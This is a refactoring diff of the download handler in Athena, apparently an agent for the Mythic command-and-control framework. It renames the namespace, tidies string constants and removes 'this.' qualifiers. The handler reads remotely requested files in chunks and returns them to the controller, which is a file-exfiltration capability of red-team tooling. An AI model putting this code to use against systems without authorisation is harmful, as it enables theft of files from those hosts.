@@ -3,8 +3,9 @@ using Athena.Models;
 using Athena.Utilities;
 using System.Collections.Concurrent;
 using System.Diagnostics;
+using Athena.Models.Responses;
 
-namespace Athena.Commands
+namespace Athena.Handler.Common.FileSystem
 {
     public class DownloadHandler
     {
@@ -21,13 +22,13 @@ namespace Athena.Commands
         {
             MythicDownloadJob downloadJob = new MythicDownloadJob(job);
             Dictionary<string, string> par = Misc.ConvertJsonStringToDict(job.task.parameters);
-            downloadJob.path = par["File"].Replace("\"", String.Empty);
-            downloadJob.total_chunks = await this.GetTotalChunks(downloadJob);
-            this.downloadJobs.GetOrAdd(job.task.id, downloadJob);
+            downloadJob.path = par["File"].Replace("\"", string.Empty);
+            downloadJob.total_chunks = await GetTotalChunks(downloadJob);
+            downloadJobs.GetOrAdd(job.task.id, downloadJob);
             Debug.WriteLine($"[{DateTime.Now}] Starting download job ({downloadJob.chunk_num}/{downloadJob.total_chunks})");
             if (downloadJob.total_chunks == 0)
             {
-                this.downloadJobs.Remove(job.task.id, out _);
+                downloadJobs.Remove(job.task.id, out _);
 
                 return new DownloadResponse
                 {
@@ -45,14 +46,14 @@ namespace Athena.Commands
                     total_chunks = downloadJob.total_chunks,
                     full_path = downloadJob.path,
                     chunk_num = 0,
-                    chunk_data = String.Empty,
+                    chunk_data = string.Empty,
                     is_screenshot = false,
                     host = "",
                 },
-                user_output = String.Empty,
+                user_output = string.Empty,
                 task_id = job.task.id,
                 completed = false,
-                status = String.Empty,
+                status = string.Empty,
                 file_id = null
             }.ToJson();
         }
@@ -70,7 +71,7 @@ namespace Athena.Commands
         /// <param name="task_id">ID of the download job</param>
         public async Task<MythicDownloadJob> GetDownloadJob(string task_id)
         {
-            return this.downloadJobs[task_id];
+            return downloadJobs[task_id];
         }
         /// <summary>
         /// Read the next chunk from the file
@@ -94,7 +95,7 @@ namespace Athena.Commands
                 {
                     FileInfo fileInfo = new FileInfo(job.path);
 
-                    if(fileInfo.Length - totalBytesRead < job.chunk_size)
+                    if (fileInfo.Length - totalBytesRead < job.chunk_size)
                     {
                         job.complete = true;
                         buffer = new byte[fileInfo.Length - job.bytesRead];
@@ -136,7 +137,7 @@ namespace Athena.Commands
         /// <param name="task_id">The task ID of the download job to complete</param>
         public async Task CompleteDownloadJob(string task_id)
         {
-            this.downloadJobs.Remove(task_id, out _);
+            downloadJobs.Remove(task_id, out _);
         }
     }
 }
